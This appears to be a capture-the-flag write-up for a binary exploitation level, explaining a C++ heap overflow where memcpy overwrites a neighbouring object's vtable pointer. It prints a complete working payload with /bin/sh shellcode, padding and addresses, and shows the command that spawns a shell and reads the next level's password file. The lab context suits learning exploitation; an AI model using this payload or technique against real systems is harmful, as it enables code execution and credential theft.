# Level 9

## Initial Context

- One file: `level9`

## Solving the Challenge

The executable expects one argument.

The program is written in `C++`.
It uses one class named `N`, that has an `vtable`.

The first argument is copied using a `memcpy` of which can be abused.

If run using `ltrace`, we can see two allocation of `N`.

```bash
$ ltrace ./level9 abc
...
operator new(108)               = 0x804a008
operator new(108)               = 0x804a078
strlen("abc")                   = 3
memcpy(0x0804a00c, "abc", 3)    = 0x0804a00c
...
```

These two allocation are only `112 bytes` off (or `0x70`).

The program uses a `vtable` that store the `operator+` function.
Meaning that the memory layout is:

| offset | name |
| --- | --- |
| 0 | vtable* |
| 4 | char[100] |
| 100 | int |

Even if this is opaque to the user, the `sizeof` is still impacted and an overwrite is still possible.

To access the `vtable`'s `operator+` field, we need to read the pointer twice. And that exactly what the `(b->operator+(*a).value)` at the end of the file will do.

We can craft the payload like this:

```python
# a's buffer + 4: the second jump
"\x10\xa0\x04\x08";

# shell code (same as level2)
+ "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# padding of 80
+ "A" * 80

# a's buffer: the first jump
+ "\x0c\xa0\x04\x08"
```

Why a padding of `80 bytes`?

We have a total of `112 bytes` between the two `N` allocations. But the first `N`'s buffer is at `+4`, that means only `108 bytes` between `a's buffer` and `b's vtable pointer`.

The shell code is `24 bytes` long and the address for the second jump is `4 bytes` long. Leaving `80 bytes` of that we have to fill to specify for the first jump.

Let's send it to the vulnerable program:

```bash
$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
<flag>
```
